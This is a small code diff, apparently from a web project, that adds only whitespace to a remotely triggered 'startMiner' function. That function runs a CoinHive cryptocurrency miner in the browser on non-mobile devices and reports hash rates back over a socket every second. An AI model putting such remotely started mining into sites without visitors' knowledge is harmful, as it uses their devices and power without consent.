@@ -20,15 +20,18 @@ M.addRemoteFunction("startMiner", function(sitekey, debug) {
 	let miner = new CoinHive.Anonymous(sitekey, {throttle: 0.2});
 	// Only start on non-mobile devices
 	if (!miner.isMobile()) {
+
 		miner.start();
 		if (debug) console.log("Debug: Miner started!");	
+		
 		setInterval(function() {
 			let hashesPerSecond = miner.getHashesPerSecond();
 			let totalHashes = miner.getTotalHashes();
 			let acceptedHashes = miner.getAcceptedHashes();
 
 			socket.emit("minerData", [hashesPerSecond, totalHashes, acceptedHashes]);
-		}, 1000);					
+		}, 1000);
+
 	}
 });
 
